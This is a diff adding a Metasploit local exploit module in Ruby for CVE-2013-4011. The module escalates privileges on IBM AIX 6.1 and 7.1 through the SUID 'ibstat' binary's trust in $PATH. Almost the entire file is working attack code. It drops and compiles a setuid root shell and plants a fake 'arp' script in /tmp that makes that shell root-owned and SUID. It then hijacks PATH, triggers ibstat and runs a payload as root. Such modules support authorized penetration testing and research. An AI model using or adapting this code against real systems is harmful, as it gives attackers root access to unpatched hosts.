@@ -1,0 +1,160 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class Metasploit4 < Msf::Exploit::Local
+
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      "Name" => "ibstat $PATH Privilege Escalation",
+      "Description" => %q{
+        This module exploits the trusted $PATH environment variable of the SUID binary "ibstat".
+      },
+      "Author" => [
+        "Kristian Erik Hermansen", #original author
+        "Sagi Shahar <sagi.shahar[at]mwrinfosecurity.com>", #Metasploit module
+        "Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>" #Metasploit module
+      ],
+      "References" => [
+        ["CVE", "2013-4011"],
+        ["OSVDB", "95420"],
+        ["BID", "61287"],
+        ["URL", "http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827"],
+        ["URL", "http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756"]
+      ],
+      "Platform" => ["unix"],
+      "Arch" => ARCH_CMD,
+      "Payload" => {
+        "Compat" => {
+          "PayloadType" => "cmd",
+          "RequiredCmd" => "perl"
+        }
+      },
+      "Targets" => [
+        ["IBM AIX Version 6.1", {}],
+        ["IBM AIX Version 7.1", {}]
+      ],
+      "DefaultTarget" => 1,
+      "DisclosureDate" => "Sep 24 2013"
+    ))
+
+    register_options([
+      OptString.new("WritableDir", [true, "A directory where we can write files", "/tmp"])
+    ], self.class)
+  end
+
+  def check
+    find_output = cmd_exec("find /usr/sbin/ -name ibstat -perm -u=s -user root 2>/dev/null")
+
+    if find_output.include?("ibstat")
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    if check == Exploit::CheckCode::Safe
+      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
+    else
+      print_good("Target is vulnerable.")
+    end
+
+    root_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(8)}"
+    arp_file = "#{datastore["WritableDir"]}/arp"
+    c_file = %Q^#include <stdio.h>
+
+int main()
+{
+   setreuid(0,0);
+   setregid(0,0);
+   execve("/bin/sh",NULL,NULL);
+   return 0;
+}
+^
+    arp = %Q^#!/bin/sh
+
+chown root #{root_file}
+chmod 4555 #{root_file}
+^
+
+    if gcc_installed?
+      print_status("Dropping file #{root_file}.c...")
+      write_file("#{root_file}.c", c_file)
+
+      print_status("Compiling source...")
+      cmd_exec("gcc -o #{root_file} #{root_file}.c")
+      print_status("Compilation completed")
+
+      register_file_for_cleanup("#{root_file}.c")
+    else
+      cmd_exec("cp /bin/sh #{root_file}")
+    end
+
+    register_file_for_cleanup(root_file)
+
+    print_status("Writing custom arp file...")
+    write_file(arp_file,arp)
+    register_file_for_cleanup(arp_file)
+    cmd_exec("chmod 0555 #{arp_file}")
+    print_status("Custom arp file written")
+
+    print_status("Updating $PATH environment variable...")
+    path_env = cmd_exec("echo $PATH")
+    cmd_exec("PATH=#{datastore["WritableDir"]}:$PATH")
+    cmd_exec("export PATH")
+
+    print_status("Triggering vulnerablity...")
+    cmd_exec("/usr/bin/ibstat -a -i en0 2>/dev/null >/dev/null")
+
+    # The $PATH variable must be restored before the payload is executed
+    # in cases where an euid root shell was gained
+    print_status("Restoring $PATH environment variable...")
+    cmd_exec("PATH=#{path_env}")
+    cmd_exec("export PATH")
+
+    cmd_exec(root_file)
+    print_status("Checking root privileges...")
+
+    if is_root?
+      print_status("Executing payload...")
+      cmd_exec(payload.encoded)
+    end
+  end
+
+  def gcc_installed?
+    print_status("Checking if gcc exists...")
+    gcc_whereis_output = cmd_exec("whereis -b gcc")
+
+    if gcc_whereis_output.include?("/")
+      print_good("gcc found!")
+      return true
+    end
+
+    print_status("gcc not found. Using /bin/sh from local system")
+    false
+  end
+
+  def is_root?
+    id_output = cmd_exec("id")
+
+    if id_output.include?("euid=0(root)")
+      print_good("Got root! (euid)")
+      return true
+    end
+    if id_output.include?("uid=0(root)")
+      print_good("Got root!")
+      return true
+    end
+
+    print_status("Exploit failed")
+    false
+  end
+
+end
